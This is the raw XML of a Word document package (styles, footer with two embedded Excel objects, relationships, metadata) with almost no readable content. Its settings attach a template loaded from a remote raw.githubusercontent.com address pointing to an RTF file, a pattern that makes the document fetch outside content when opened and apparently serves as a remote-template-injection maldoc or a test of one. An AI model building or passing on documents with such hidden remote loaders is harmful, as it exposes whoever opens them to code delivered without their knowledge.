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Default Extension="xlsx" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet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5AA" w:rsidRDefault="005625AA"/>
    <w:sectPr w:rsidR="005625AA" w:rsidSect="005625A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BC0" w:rsidRDefault="00485BC0" w:rsidP="008354A3">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00485BC0" w:rsidRDefault="00485BC0" w:rsidP="00835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4A3" w:rsidRDefault="008354A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4A3" w:rsidRDefault="008354A3">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <m:oMathPara>
      <m:oMath>
        <m:r>
          <w:rPr>
            <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math"/>
            <w:i/>
          </w:rPr>
          <w:object w:dxaOrig="12763" w:dyaOrig="355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58.2pt;height:16.2pt" o:ole="">
              <v:imagedata r:id="rId1" o:title=""/>
            </v:shape>
            <o:OLEObject Type="Embed" ProgID="Excel.Sheet.12" ShapeID="_x0000_i1025" DrawAspect="Content" ObjectID="_1784515695" r:id="rId2"/>
          </w:object>
        </m:r>
        <m:r>
          <w:rPr>
            <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math"/>
            <w:i/>
          </w:rPr>
          <w:object w:dxaOrig="16819" w:dyaOrig="6589">
            <v:shape id="_x0000_i1026" type="#_x0000_t75" style="width:553.2pt;height:3in" o:ole="">
              <v:imagedata r:id="rId3" o:title=""/>
            </v:shape>
            <o:OLEObject Type="Embed" ProgID="Excel.Sheet.12" ShapeID="_x0000_i1026" DrawAspect="Content" ObjectID="_1784515696" r:id="rId4"/>
          </w:object>
        </m:r>
        <m:r>
          <w:rPr>
            <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math"/>
          </w:rPr>
          <m:t>A=π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m:oMathPara>
  </w:p>
  <w:p w:rsidR="008354A3" w:rsidRDefault="008354A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4A3" w:rsidRDefault="008354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BC0" w:rsidRDefault="00485BC0" w:rsidP="008354A3">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00485BC0" w:rsidRDefault="00485BC0" w:rsidP="00835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4A3" w:rsidRDefault="008354A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4A3" w:rsidRDefault="008354A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4A3" w:rsidRDefault="008354A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54A3"/>
    <w:rsid w:val="00123A54"/>
    <w:rsid w:val="00251F51"/>
    <w:rsid w:val="0025729F"/>
    <w:rsid w:val="00277F68"/>
    <w:rsid w:val="00283794"/>
    <w:rsid w:val="00447E9C"/>
    <w:rsid w:val="00485BC0"/>
    <w:rsid w:val="004A7231"/>
    <w:rsid w:val="0054107E"/>
    <w:rsid w:val="005625AA"/>
    <w:rsid w:val="005672C9"/>
    <w:rsid w:val="00717B0B"/>
    <w:rsid w:val="008354A3"/>
    <w:rsid w:val="00863B09"/>
    <w:rsid w:val="009F11E1"/>
    <w:rsid w:val="00B52CCD"/>
    <w:rsid w:val="00C210AB"/>
    <w:rsid w:val="00D25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ttachedTemplate r:id="rId1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35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54A3"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00835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4A3"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00835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4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package" Target="embeddings/Microsoft_Office_Excel_Worksheet1.xlsx"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.emf"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/package" Target="embeddings/Microsoft_Office_Excel_Worksheet2.xls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raw.githubusercontent.com/davidforis/pytraining/refs/heads/master/test.rtf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1</Lines>
  <Paragraphs>1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91974</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>91974</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-08-07T00:30:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-08-07T00:32:00Z</dcterms:modified>
</cp:coreProperties>
</file>